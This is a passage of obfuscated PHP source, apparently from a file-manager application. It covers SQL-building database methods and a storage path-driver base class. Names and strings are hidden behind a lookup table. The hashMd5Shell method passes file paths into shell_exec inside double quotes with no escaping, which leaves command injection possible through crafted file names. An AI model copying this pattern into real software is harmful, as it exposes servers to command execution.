$this->parseLock(isset($–†û€ê²[$å–„¹ãÅ[846]]) ? $–†û€ê²[$å–„¹ãÅ[846]] : !1); $ÛûşÌÓ¶ .= $this->parseComment(!empty($–†û€ê²[$å–„¹ãÅ[363]]) ? $–†û€ê²[$å–„¹ãÅ[363]] : $å–„¹ãÅ[12]); return $this->execute($ÛûşÌÓ¶, $this->parseBind(!empty($–†û€ê²[$å–„¹ãÅ[294]]) ? $–†û€ê²[$å–„¹ãÅ[294]] : array())); } public function selectInsert($äí°ÛÃ, $·Ù‰Û´á, $¨¯…Ç»í = array()) { $ÓéÆù =& $_SERVER[„Ç©ñÎ©]; $this->model = $¨¯…Ç»í[$ÓéÆù[290]]; if (is_string($äí°ÛÃ)) { $äí°ÛÃ = explode($ÓéÆù[50], $äí°ÛÃ); } array_walk($äí°ÛÃ, array($this, $ÓéÆù[905])); $ĞØªñ‰ê = $ÓéÆù[1039] . $this->parseTable($·Ù‰Û´á) . $ÓéÆù[902] . implode($ÓéÆù[50], $äí°ÛÃ) . $ÓéÆù[1017]; $ĞØªñ‰ê .= $this->buildSelectSql($¨¯…Ç»í); return $this->execute($ĞØªñ‰ê, $this->parseBind(!empty($¨¯…Ç»í[$ÓéÆù[294]]) ? $¨¯…Ç»í[$ÓéÆù[294]] : array())); } public function update($œã¤ßäÈ, $¿«ÅšçÚ) { $èŸëÚ¸ =& $_SERVER[„Ç©ñÎ©]; $this->model = $¿«ÅšçÚ[$èŸëÚ¸[290]]; $â²şöÀë = $èŸëÚ¸[1040] . $this->parseTable($¿«ÅšçÚ[$èŸëÚ¸[288]]) . $this->parseSet($œã¤ßäÈ) . $this->parseWhere(!empty($¿«ÅšçÚ[$èŸëÚ¸[284]]) ? $¿«ÅšçÚ[$èŸëÚ¸[284]] : $èŸëÚ¸[12]) . $this->parseOrder(!empty($¿«ÅšçÚ[$èŸëÚ¸[374]]) ? $¿«ÅšçÚ[$èŸëÚ¸[374]] : $èŸëÚ¸[12]) . $this->parseLimit(!empty($¿«ÅšçÚ[$èŸëÚ¸[301]]) ? $¿«ÅšçÚ[$èŸëÚ¸[301]] : $èŸëÚ¸[12]) . $this->parseLock(isset($¿«ÅšçÚ[$èŸëÚ¸[846]]) ? $¿«ÅšçÚ[$èŸëÚ¸[846]] : !1) . $this->parseComment(!empty($¿«ÅšçÚ[$èŸëÚ¸[363]]) ? $¿«ÅšçÚ[$èŸëÚ¸[363]] : $èŸëÚ¸[12]); return $this->execute($â²şöÀë, $this->parseBind(!empty($¿«ÅšçÚ[$èŸëÚ¸[294]]) ? $¿«ÅšçÚ[$èŸëÚ¸[294]] : array())); } public function delete($ø¶ï·Ì = array()) { $ŞÍ¶ÀÉ =& $_SERVER[„Ç©ñÎ©]; $this->model = $ø¶ï·Ì[$ŞÍ¶ÀÉ[290]]; $¬ë“¦—¦ = $ŞÍ¶ÀÉ[1041] . $this->parseTable($ø¶ï·Ì[$ŞÍ¶ÀÉ[288]]) . $this->parseWhere(!empty($ø¶ï·Ì[$ŞÍ¶ÀÉ[284]]) ? $ø¶ï·Ì[$ŞÍ¶ÀÉ[284]] : $ŞÍ¶ÀÉ[12]) . $this->parseOrder(!empty($ø¶ï·Ì[$ŞÍ¶ÀÉ[374]]) ? $ø¶ï·Ì[$ŞÍ¶ÀÉ[374]] : $ŞÍ¶ÀÉ[12]) . $this->parseLimit(!empty($ø¶ï·Ì[$ŞÍ¶ÀÉ[301]]) ? $ø¶ï·Ì[$ŞÍ¶ÀÉ[301]] : $ŞÍ¶ÀÉ[12]) . $this->parseLock(isset($ø¶ï·Ì[$ŞÍ¶ÀÉ[846]]) ? $ø¶ï·Ì[$ŞÍ¶ÀÉ[846]] : !1) . $this->parseComment(!empty($ø¶ï·Ì[$ŞÍ¶ÀÉ[363]]) ? $ø¶ï·Ì[$ŞÍ¶ÀÉ[363]] : $ŞÍ¶ÀÉ[12]); return $this->execute($¬ë“¦—¦, $this->parseBind(!empty($ø¶ï·Ì[$ŞÍ¶ÀÉ[294]]) ? $ø¶ï·Ì[$ŞÍ¶ÀÉ[294]] : array())); } public function select($øöú•˜ = array()) { $‹ñøÈšë =& $_SERVER[„Ç©ñÎ©]; $this->model = $øöú•˜[$‹ñøÈšë[290]]; $û½ÚÉøÙ = $this->buildSelectSql($øöú•˜); $ÇÕ´µÏ£ = isset($øöú•˜[$‹ñøÈšë[358]]) ? $øöú•˜[$‹ñøÈšë[358]] : !1; if ($ÇÕ´µÏ£) { $„µÖÎü— = is_string($ÇÕ´µÏ£[$‹ñøÈšë[104]]) ? $ÇÕ´µÏ£[$‹ñøÈšë[104]] : $‹ñøÈšë[1042] . md5($û½ÚÉøÙ); $Ú“ğÌÈ = think_cache($„µÖÎü—, $‹ñøÈšë[12], $ÇÕ´µÏ£); if (!1 !== $Ú“ğÌÈ) { return $Ú“ğÌÈ; } } $±ó“Ñğ… = $this->query($û½ÚÉøÙ, $this->parseBind(!empty($øöú•˜[$‹ñøÈšë[294]]) ? $øöú•˜[$‹ñøÈšë[294]] : array())); if ($ÇÕ´µÏ£ && !1 !== $±ó“Ñğ…) { think_cache($„µÖÎü—, $±ó“Ñğ…, $ÇÕ´µÏ£); } return $±ó“Ñğ…; } public function buildSelectSql($å“¸»´— = array()) { $¾™Š€ =& $_SERVER[„Ç©ñÎ©]; if (isset($å“¸»´—[$¾™Š€[362]])) { if (strpos($å“¸»´—[$¾™Š€[362]], $¾™Š€[50])) { list($ä®Ôàíõ, $¶œîÖ¹Ÿ) = explode($¾™Š€[50], $å“¸»´—[$¾™Š€[362]]); } else { $ä®Ôàíõ = $å“¸»´—[$¾™Š€[362]]; } $ä®Ôàíõ = $ä®Ôàíõ ? $ä®Ôàíõ : 1; $¶œîÖ¹Ÿ = isset($¶œîÖ¹Ÿ) ? $¶œîÖ¹Ÿ : (is_numeric($å“¸»´—[$¾™Š€[301]]) ? $å“¸»´—[$¾™Š€[301]] : 20); $Ñ•ß„ßÊ = $¶œîÖ¹Ÿ * ((int) $ä®Ôàíõ - 1); $å“¸»´—[$¾™Š€[301]] = $Ñ•ß„ßÊ . $¾™Š€[50] . $¶œîÖ¹Ÿ; } if (think_config($¾™Š€[1043])) { $ÑÏ–é® = $¾™Š€[1044] . md5(serialize($å“¸»´—)); $Š¸ÛÛ©ñ = think_cache($ÑÏ–é®); if ($Š¸ÛÛ©ñ) { return $Š¸ÛÛ©ñ; } } $€ŞÃáƒ = $this->parseSql($this->selectSql, $å“¸»´—); $€ŞÃáƒ .= $this->parseLock(isset($å“¸»´—[$¾™Š€[846]]) ? $å“¸»´—[$¾™Š€[846]] : !1); if (isset($ÑÏ–é®)) { think_cache($ÑÏ–é®, $€ŞÃáƒ); } return $€ŞÃáƒ; } public function parseSql($ãÕÖ®¼, $êÌˆ¦ä° = array()) { $ĞÀàùÇÖ =& $_SERVER[„Ç©ñÎ©]; $ãÕÖ®¼ = str_replace(array($ĞÀàùÇÖ[1045], $ĞÀàùÇÖ[1046], $ĞÀàùÇÖ[1047], $ĞÀàùÇÖ[1048], $ĞÀàùÇÖ[1049], $ĞÀàùÇÖ[1050], $ĞÀàùÇÖ[1051], $ĞÀàùÇÖ[1052], $ĞÀàùÇÖ[1053], $ĞÀàùÇÖ[1054], $ĞÀàùÇÖ[1055]), array($this->parseTable("{$êÌˆ¦ä°[$ĞÀàùÇÖ[288]]}"), $this->parseDistinct(isset($êÌˆ¦ä°[$ĞÀàùÇÖ[1056]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[1056]] : !1), $this->parseField(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[282]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[282]] : $ĞÀàùÇÖ[198]), $this->parseJoin(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[291]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[291]] : $ĞÀàùÇÖ[12]), $this->parseWhere(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[284]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[284]] : $ĞÀàùÇÖ[12]), $this->parseGroup(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[524]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[524]] : $ĞÀàùÇÖ[12]), $this->parseHaving(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[1057]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[1057]] : $ĞÀàùÇÖ[12]), $this->parseOrder(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[374]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[374]] : $ĞÀàùÇÖ[12]), $this->parseLimit(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[301]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[301]] : $ĞÀàùÇÖ[12]), $this->parseUnion(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[356]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[356]] : $ĞÀàùÇÖ[12]), $this->parseComment(!empty($êÌˆ¦ä°[$ĞÀàùÇÖ[363]]) ? $êÌˆ¦ä°[$ĞÀàùÇÖ[363]] : $ĞÀàùÇÖ[12])), $ãÕÖ®¼); return $ãÕÖ®¼; } public function getLastSql($€ÀÁµäª = '') { return $€ÀÁµäª ? $this->modelSql[$€ÀÁµäª] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¾÷–ã›ß) { return addslashes($¾÷–ã›ß); } public function setModel($äÌáÛ‘‘) { $this->model = $äÌáÛ‘‘; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto C¦ ­·Œˆ; eçµ¢ñ»£ƒ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $òá¡Ä¯¡ =& $_SERVER[„Ç©ñÎ©]; $this->objectDriver = array($òá¡Ä¯¡[70], $òá¡Ä¯¡[71], $òá¡Ä¯¡[72], $òá¡Ä¯¡[73], $òá¡Ä¯¡[74], $òá¡Ä¯¡[75], $òá¡Ä¯¡[76], $òá¡Ä¯¡[77], $òá¡Ä¯¡[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($©•ÂÜ§) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($©•ÂÜ§, $_SERVER[„Ç©ñÎ©][8]); } return $©•ÂÜ§; } public function iconvApp($ÒøÈµˆ¢) { return $ÒøÈµˆ¢; } public function iconvSystem($é“ øüÃ) { return $é“ øüÃ; } public function iconvTo($ûØ›¦ü‘, $ÆÛ˜ˆõ», $şÍù«¨) { $îş™ú§– =& $_SERVER[„Ç©ñÎ©]; if (!$ûØ›¦ü‘ || !function_exists($îş™ú§–[79])) { return $ûØ›¦ü‘; } static $¢±öà = array(); $íŒøØ«æ = $ÆÛ˜ˆõ» . $îş™ú§–[80] . $şÍù«¨ . $îş™ú§–[81] . $ûØ›¦ü‘; if (isset($¢±öà[$íŒøØ«æ])) { return $¢±öà[$íŒøØ«æ]; } if (function_exists($îş™ú§–[82])) { $ûĞŸî¡³ = @mb_convert_encoding($ûØ›¦ü‘, $şÍù«¨, $ÆÛ˜ˆõ»); } else { $ûĞŸî¡³ = @iconv($ÆÛ˜ˆõ», $şÍù«¨, $ûØ›¦ü‘); } $ûĞŸî¡³ = $ûĞŸî¡³ ? $ûĞŸî¡³ : $ûØ›¦ü‘; if (strstr($ûĞŸî¡³, $îş™ú§–[83])) { $ûĞŸî¡³ = str_replace($îş™ú§–[83], $îş™ú§–[11], $ûĞŸî¡³); } $¢±öà[$ÆÛ˜ˆõ» . $îş™ú§–[80] . $şÍù«¨ . $îş™ú§–[81] . $ûØ›¦ü‘] = $ûĞŸî¡³; $¢±öà[$şÍù«¨ . $îş™ú§–[80] . $ÆÛ˜ˆõ» . $îş™ú§–[81] . $ûØ›¦ü‘] = $ûØ›¦ü‘; $¢±öà[$şÍù«¨ . $îş™ú§–[80] . $ÆÛ˜ˆõ» . $îş™ú§–[81] . $ûĞŸî¡³] = $ûØ›¦ü‘; $¢±öà[$ÆÛ˜ˆõ» . $îş™ú§–[80] . $şÍù«¨ . $îş™ú§–[81] . $ûĞŸî¡³] = $ûĞŸî¡³; return $ûĞŸî¡³; } public function getPathInner($‰ËÙ§§) { $èì„¬¡ = IO::init($‰ËÙ§§); return $èì„¬¡->path; } public function getPathOuter($‘š˜–“Ÿ) { $Êä™ğÕ =& $_SERVER[„Ç©ñÎ©]; $Û©ü™Úı = strlen(trim($this->pathBase, $Êä™ğÕ[8])); $‘š˜–“Ÿ = substr(trim($‘š˜–“Ÿ, $Êä™ğÕ[8]), $Û©ü™Úı); return $this->pathDriver . $Êä™ğÕ[8] . ltrim($‘š˜–“Ÿ, $Êä™ğÕ[8]); } public function isParentOf($ˆã§½½, $ûƒÃÅúé) { $¢Á¨ ÃÎ =& $_SERVER[„Ç©ñÎ©]; $ˆã§½½ = rtrim(strtolower($ˆã§½½), $¢Á¨ ÃÎ[8]) . $¢Á¨ ÃÎ[8]; $ûƒÃÅúé = rtrim(strtolower($ûƒÃÅúé), $¢Á¨ ÃÎ[8]) . $¢Á¨ ÃÎ[8]; $¶ÎÑ¾è = strpos($ûƒÃÅúé, $ˆã§½½) === 0; return $¶ÎÑ¾è; } public function getType() { $ìçù£Á… =& $_SERVER[„Ç©ñÎ©]; $ÈàÚ¯Ì = str_replace($ìçù£Á…[84], $ìçù£Á…[12], get_class($this)); return strtolower($ÈàÚ¯Ì); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ò¤Â±†ñ, $ú¼—¸ò•) { $“·Çœƒ =& $_SERVER[„Ç©ñÎ©]; $¿Ëƒ½Ú = rtrim($ò¤Â±†ñ, $“·Çœƒ[8]) . $“·Çœƒ[8] . $ú¼—¸ò•; $¥–óğÔ = $this->exist($¿Ëƒ½Ú); return $¥–óğÔ ? $¿Ëƒ½Ú : !1; } public function setModifyTime($¾¾ÉŸõ, $ĞµçÂ© = '') { } public function renameObject($«––¨ÄÇ, $ÛŒ´—¦‚) { $Í”¤Ó°ğ = $ÛŒ´—¦‚; $«––¨ÄÇ = $this->getPathOuter($«––¨ÄÇ); $ÛŒ´—¦‚ = $this->pathFather($«––¨ÄÇ) . $ÛŒ´—¦‚; $ğ½ïÅÁ = IO::copy($«––¨ÄÇ, $this->pathFather($«––¨ÄÇ), REPEAT_RENAME_FOLDER, $Í”¤Ó°ğ); if ($ğ½ïÅÁ) { IO::remove($«––¨ÄÇ); } return $ğ½ïÅÁ ? $ÛŒ´—¦‚ : !1; } public function tempFile($£š¼î¶À = '', $•á¾Íóƒ = '') { if (!$£š¼î¶À) { $£š¼î¶À = rand_string(15); } $§Äã˜©‰ = TEMP_FILES . rand_string(15) . $_SERVER[„Ç©ñÎ©][8]; @mkdir($§Äã˜©‰, DEFAULT_PERRMISSIONS, !0); $–³ëÈŠâ = $§Äã˜©‰ . $£š¼î¶À; @touch($–³ëÈŠâ); if ($•á¾Íóƒ) { file_put_contents($–³ëÈŠâ, $•á¾Íóƒ); } return $–³ëÈŠâ; } public function tempFileRemve($¸ëšŒÑ‡) { @unlink($¸ëšŒÑ‡); @rmdir($this->pathFather($¸ëšŒÑ‡)); } public function mkfile($˜ú…áÖ, $¯™ã¼½» = '', $ç›ïî® = REPEAT_RENAME) { } public function mkdir($Üş¢¨ùê, $»øç¯ê‡ = REPEAT_SKIP) { } public function delFile($ »¦½×) { } public function delFolder($ëªÆğ•) { } public function copyFile($àŒË¯áŒ, $±ĞĞšü¤) { } public function moveFile($«¥Ãï·Ù, $½šğ— á) { } public function remove($…¢Œ¿İä) { if ($this->isFile($…¢Œ¿İä)) { return $this->delFile($…¢Œ¿İä); } return $this->delFolder($…¢Œ¿İä); } public function rename($¢ñö„ª«, $²ÂÔ÷ğË) { } public function exist($ŞœÆÌ‘) { } public function findByHash($¢¯á­– = '', $¸à¶€ü« = '') { return !1; } public function isFile($¬š”À¬) { } public function isFolder($ğèÌ®¡Æ) { } public function size($©¾êü) { } public function info($Ÿ¨¦÷¿â) { } public function infoSimple($‚æ£‰ˆ‹) { return $this->info($‚æ£‰ˆ‹); } public function infoAuth($İí‚‘™®) { return $this->info($İí‚‘™®); } public function infoFull($Å…ë“ëá) { return $this->info($Å…ë“ëá); } public function infoWithChildren($ÍóÙòÚ±) { $ÚœÄõó =& $_SERVER[„Ç©ñÎ©]; static $ÅÓì¦ª™ = array(); if (isset($ÅÓì¦ª™[$ÍóÙòÚ±])) { return $ÅÓì¦ª™[$ÍóÙòÚ±]; } $Ú¾¥Œ£­ = $this->info($ÍóÙòÚ±); if ($Ú¾¥Œ£­ && $Ú¾¥Œ£­[$ÚœÄõó[33]] == $ÚœÄõó[85]) { $¢×ä½Ñº = array($ÚœÄõó[86] => 0, $ÚœÄõó[87] => 0, $ÚœÄõó[88] => 0); $this->infoChildren($ÍóÙòÚ±, $¢×ä½Ñº); $Ú¾¥Œ£­[$ÚœÄõó[86]] = $¢×ä½Ñº[$ÚœÄõó[86]]; $Ú¾¥Œ£­[$ÚœÄõó[89]] = array($ÚœÄõó[90] => $¢×ä½Ñº[$ÚœÄõó[87]], $ÚœÄõó[91] => $¢×ä½Ñº[$ÚœÄõó[88]]); $ÅÓì¦ª™[$ÍóÙòÚ±] = $Ú¾¥Œ£­; } return $Ú¾¥Œ£­; } public function listPath($šÇõØú, $‚üØ‰× = false) { } public function has($™Ó·€àê, $İÁßÍš™ = false, $êœ¹Ÿã¬ = false) { } public function canRead($ëø¬Èš) { } public function canWrite($æÅàãÁï) { } public function getContent($ˆÆ³ïû) { } public function setContent($¯ğ«âà°, $õµÉ×Ï¼ = '') { } protected function infoChildren($ÍØ©û‰£, &$ï¼º¶×í) { $ıƒ¹ªÕó =& $_SERVER[„Ç©ñÎ©]; check_abort_echo(); $¦•‡Ê¨² = $this->listPath($ÍØ©û‰£, !0); $¦•‡Ê¨² = array_merge($¦•‡Ê¨²[$ıƒ¹ªÕó[92]], $¦•‡Ê¨²[$ıƒ¹ªÕó[93]]); foreach ($¦•‡Ê¨² as $óıÜĞŠ”) { if ($óıÜĞŠ”[$ıƒ¹ªÕó[33]] == $ıƒ¹ªÕó[85]) { $ï¼º¶×í[$ıƒ¹ªÕó[88]]++; $Í‘ìæ‰¬ = $this->getPathInner($óıÜĞŠ”[$ıƒ¹ªÕó[94]]); $this->infoChildren($Í‘ìæ‰¬, $ï¼º¶×í); } else { $ï¼º¶×í[$ıƒ¹ªÕó[87]]++; $ï¼º¶×í[$ıƒ¹ªÕó[86]] += $óıÜĞŠ”[$ıƒ¹ªÕó[86]]; } } } public function fileSubstr($ô˜Ò”ó‚, $–ÛÀĞË, $À’ÒŠÈš) { } public function listAll($‚ôÚ—é) { } public function listAllMake($ìíÏ÷à, &$º¥öÌ±) { $¯œ†Îš‰ =& $_SERVER[„Ç©ñÎ©]; check_abort_echo(); $ä¼÷è• = $this->listPath($ìíÏ÷à, !0); if (!$ä¼÷è•) { return; } $Îö¶‚» = array_merge($ä¼÷è•[$¯œ†Îš‰[92]], $ä¼÷è•[$¯œ†Îš‰[93]]); foreach ($Îö¶‚» as $ÑÒ›Ê¯ê) { $à€ğ¡¥ò = $ÑÒ›Ê¯ê[$¯œ†Îš‰[33]] == $¯œ†Îš‰[85]; $ú‡â–é = array($¯œ†Îš‰[94] => $ÑÒ›Ê¯ê[$¯œ†Îš‰[94]], $¯œ†Îš‰[85] => $à€ğ¡¥ò); if (isset($ÑÒ›Ê¯ê[$¯œ†Îš‰[86]])) { $ú‡â–é[$¯œ†Îš‰[86]] = $ÑÒ›Ê¯ê[$¯œ†Îš‰[86]]; } if (isset($ÑÒ›Ê¯ê[$¯œ†Îš‰[95]])) { $ú‡â–é[$¯œ†Îš‰[95]] = $ÑÒ›Ê¯ê[$¯œ†Îš‰[95]]; } if (!$à€ğ¡¥ò) { $º¥öÌ±[] = $ú‡â–é; continue; } $º¥öÌ±[] = $ú‡â–é; $Ô’Õë¨â = $ÑÒ›Ê¯ê[$¯œ†Îš‰[94]]; $ô“†¥¬Ç = $this->pathDriver; if (substr($ÑÒ›Ê¯ê[$¯œ†Îš‰[94]], 0, strlen($ô“†¥¬Ç)) == $ô“†¥¬Ç) { $Ô’Õë¨â = substr($Ô’Õë¨â, strlen($ô“†¥¬Ç)); } $this->listAllMake($Ô’Õë¨â, $º¥öÌ±); } } public function listAllSimple($²¾Æî›) { $ä‹îâÅ =& $_SERVER[„Ç©ñÎ©]; $¸·éÍ¤Š = array(); $ø¹¶–Å£ = $this->listAll($²¾Æî›); $½®•Î›“ = $this->getPathOuter($²¾Æî›); foreach ($ø¹¶–Å£ as $ó”„ó’) { $ñŸ¬Âë¹ = $ó”„ó’[$ä‹îâÅ[94]]; $»”Ë«Î¡ = $ó”„ó’[$ä‹îâÅ[94]]; if (isset($ó”„ó’[$ä‹îâÅ[96]])) { $ñŸ¬Âë¹ = $ó”„ó’[$ä‹îâÅ[96]][$ä‹îâÅ[94]]; $ó”„ó’[$ä‹îâÅ[86]] = $ó”„ó’[$ä‹îâÅ[96]][$ä‹îâÅ[86]]; $ó”„ó’[$ä‹îâÅ[95]] = $ó”„ó’[$ä‹îâÅ[96]][$ä‹îâÅ[95]]; } else { $»”Ë«Î¡ = substr($ó”„ó’[$ä‹îâÅ[94]], strlen(get_path_father($½®•Î›“))); $»”Ë«Î¡ = $ä‹îâÅ[8] . ltrim($»”Ë«Î¡, $ä‹îâÅ[8]); } $¿Ïä­¸ = array($ä‹îâÅ[94] => $»”Ë«Î¡, $ä‹îâÅ[85] => $ó”„ó’[$ä‹îâÅ[85]]); if (isset($ó”„ó’[$ä‹îâÅ[86]]) && !$ó”„ó’[$ä‹îâÅ[85]]) { $¿Ïä­¸[$ä‹îâÅ[86]] = $ó”„ó’[$ä‹îâÅ[86]]; } if (isset($ó”„ó’[$ä‹îâÅ[95]])) { $¿Ïä­¸[$ä‹îâÅ[95]] = $ó”„ó’[$ä‹îâÅ[95]]; } if (!$ó”„ó’[$ä‹îâÅ[85]]) { $¿Ïä­¸[$ä‹îâÅ[97]] = $ñŸ¬Âë¹; } $¸·éÍ¤Š[] = $¿Ïä­¸; } return $¸·éÍ¤Š; } public function upload($ê˜ûÊ–İ, $Û°ëÓ‹‰, $ê«§°¼³ = false, $…ŒĞ¥ğ¨ = REPEAT_REPLACE) { } public function uploadFileByID($‚Îªª¬, $É¯òüÄ, $èòİèÑõ) { } public function uploadFileByPath($ìû›€Îå, $šä¶×ÂÊ, $œô¹áÏÛ = array()) { } public function isUploadServer() { $´úÔñ­É =& $_SERVER[„Ç©ñÎ©]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $´úÔñ­É[98]) { return !0; } return $GLOBALS[$´úÔñ­É[6]][$´úÔñ­É[99]][$´úÔñ­É[100]]; } public function isFileOutServer() { $æ¤¾„·Õ =& $_SERVER[„Ç©ñÎ©]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $æ¤¾„·Õ[98]) { return !0; } return $GLOBALS[$æ¤¾„·Õ[6]][$æ¤¾„·Õ[99]][$æ¤¾„·Õ[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ìº¯î‡”) { $÷Ä¥Ê± =& $_SERVER[„Ç©ñÎ©]; if (!$this->isCdnHost()) { return $Ìº¯î‡”; } return str_replace(trim(get_url_root($Ìº¯î‡”), $÷Ä¥Ê±[8]), trim($this->cdnHost, $÷Ä¥Ê±[8]), $Ìº¯î‡”); } public function uploadLink($÷×ÁÛäİ, $Ôî²Ë©— = 0) { $õ‚¥ôûÕ =& $_SERVER[„Ç©ñÎ©]; if ($this->isUploadServer()) { return; } $é€Â¼àô = $this->getType(); if (!in_array($é€Â¼àô, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $æË£«âì = 1024 * 1024 * 10; $‚«Î¾•¶ = $Ôî²Ë©— <= $æË£«âì ? $õ‚¥ôûÕ[102] : $õ‚¥ôûÕ[103]; $¾¿÷ëë® = (!$Ôî²Ë©— ? 1 : ceil($Ôî²Ë©— / pow(1024, 3))) * 3600 * 4; $Â—¨•ÓÇ = $this->{$‚«Î¾•¶}($÷×ÁÛäİ, $¾¿÷ëë®); if ($Â—¨•ÓÇ) { $Â—¨•ÓÇ[$õ‚¥ôûÕ[104]] = $÷×ÁÛäİ; $Â—¨•ÓÇ[$õ‚¥ôûÕ[105]] = $é€Â¼àô; } return $Â—¨•ÓÇ; } public function uploadFormData($å¸ŞœÂ, $ÚÉÆ®ßĞ = 3600) { } public function multiUploadFormData($¥¾ÄõúÊ, $ŒŸòÄ“ = 3600) { } public function download($±·œÄ¼Õ, $ŠÛ¯ÖÚÁ) { } public function ext($³¥éÁ‡Æ) { $ÎÜ…Ú¦Ñ =& $_SERVER[„Ç©ñÎ©]; if (strpos($³¥éÁ‡Æ, $ÎÜ…Ú¦Ñ[8]) === -1) { $ù³×À©ß = $³¥éÁ‡Æ; } else { $ù³×À©ß = $this->pathThis($³¥éÁ‡Æ); } $Ûù—Ï‡û = $ÎÜ…Ú¦Ñ[12]; if (strstr($ù³×À©ß, $ÎÜ…Ú¦Ñ[10])) { $Ûù—Ï‡û = substr($ù³×À©ß, strrpos($ù³×À©ß, $ÎÜ…Ú¦Ñ[10]) + 1); $Ûù—Ï‡û = strtolower($Ûù—Ï‡û); } if (strlen($Ûù—Ï‡û) > 3 && preg_match($ÎÜ…Ú¦Ñ[106], $Ûù—Ï‡û, $•ã¬§Ô­)) { $Ûù—Ï‡û = $ÎÜ…Ú¦Ñ[12]; } return $Ûù—Ï‡û; } public function pathThis($¿ë«Õü) { $Ò‡¯À =& $_SERVER[„Ç©ñÎ©]; $¿ë«Õü = str_replace($Ò‡¯À[107], $Ò‡¯À[8], rtrim($¿ë«Õü, $Ò‡¯À[8])); $İİ¸ßî = strrpos($¿ë«Õü, $Ò‡¯À[8]); if ($İİ¸ßî === !1) { return $¿ë«Õü; } return substr($¿ë«Õü, $İİ¸ßî + 1); } public function pathFather($À²ûƒË›) { $•‰Æ¹ĞŸ =& $_SERVER[„Ç©ñÎ©]; $À²ûƒË› = str_replace($•‰Æ¹ĞŸ[107], $•‰Æ¹ĞŸ[8], rtrim($À²ûƒË›, $•‰Æ¹ĞŸ[8])); $ˆ±½©Á„ = strrpos($À²ûƒË›, $•‰Æ¹ĞŸ[8]); if ($ˆ±½©Á„ === !1) { return $•‰Æ¹ĞŸ[12]; } return substr($À²ûƒË›, 0, $ˆ±½©Á„ + 1); } public function hashSimple($ÂÑ³¹òø) { $÷Éİı•‹ =& $_SERVER[„Ç©ñÎ©]; if (!$ÂÑ³¹òø) { return md5($÷Éİı•‹[12]); } $¬¡õ²¹ = $this->size($ÂÑ³¹òø); $´È›üö¤ = 200; $Í°İ‘ÂÃ = 50; if ($¬¡õ²¹ <= $´È›üö¤ * $Í°İ‘ÂÃ) { return $this->hashMd5($ÂÑ³¹òø) . $¬¡õ²¹; } $İµÙşÈ = intval($¬¡õ²¹ / $Í°İ‘ÂÃ); $ØŸ»Ÿö§ = $÷Éİı•‹[12]; for ($¾à ŒÙ­ = 0; $¾à ŒÙ­ < $Í°İ‘ÂÃ; $¾à ŒÙ­++) { $ØŸ»Ÿö§ .= $this->fileSubstr($ÂÑ³¹òø, $İµÙşÈ * $¾à ŒÙ­, $´È›üö¤); } $ØŸ»Ÿö§ .= $this->fileSubstr($ÂÑ³¹òø, $¬¡õ²¹ - $´È›üö¤, $´È›üö¤); return md5($ØŸ»Ÿö§) . $¬¡õ²¹; } public static $md5Cache = array(); public function hashMd5($ÄØ†±Â«) { if (!$ÄØ†±Â«) { return md5($_SERVER[„Ç©ñÎ©][12]); } $ÄØ†±Â« = $this->iconvSystem($ÄØ†±Â«); if (isset(self::$md5Cache[$ÄØ†±Â«])) { return self::$md5Cache[$ÄØ†±Â«]; } self::$md5Cache[$ÄØ†±Â«] = $this->hashMd5Shell($ÄØ†±Â«); if (!self::$md5Cache[$ÄØ†±Â«]) { self::$md5Cache[$ÄØ†±Â«] = @md5_file($ÄØ†±Â«); } return self::$md5Cache[$ÄØ†±Â«]; } private function hashMd5Shell($§Ñ¶†¢›) { $„›ş Ìû =& $_SERVER[„Ç©ñÎ©]; if (!$§Ñ¶†¢›) { return md5($„›ş Ìû[12]); } if (!function_exists($„›ş Ìû[108])) { return !1; } $»Ÿïß› = array($„›ş Ìû[109], $„›ş Ìû[110]); $Œ¾ï»³š = Cache::get($„›ş Ìû[111]); if (!$Œ¾ï»³š) { $çİï…ïÀ = BASIC_PATH . $„›ş Ìû[112]; $¨ôşşíö = md5_file($çİï…ïÀ); $Œ¾ï»³š = $„›ş Ìû[113]; foreach ($»Ÿïß› as $ÙÚğ¤ŞÌ) { $òœ‘¨›î = shell_exec($ÙÚğ¤ŞÌ . "\x20\x22{$çİï…ïÀ}\42"); if ($òœ‘¨›î && substr(trim($òœ‘¨›î), 0, 32) == $¨ôşşíö) { $Œ¾ï»³š = $ÙÚğ¤ŞÌ; break; } } Cache::set($„›ş Ìû[111], $Œ¾ï»³š, 3600); } if ($Œ¾ï»³š == $„›ş Ìû[113]) { return !1; } $òœ‘¨›î = shell_exec($Œ¾ï»³š . "\x20\42{$§Ñ¶†¢›}\42"); $òœ‘¨›î = str_replace($„›ş Ìû[114], $„›ş Ìû[12], $òœ‘¨›î); return substr($òœ‘¨›î, 0, 32); } public function link($ª¸Ëò›) { return $ª¸Ëò›; } public function fileOut($¾ã›Ôé, $¥ôæô½â = false, $œÎµøá† = false, 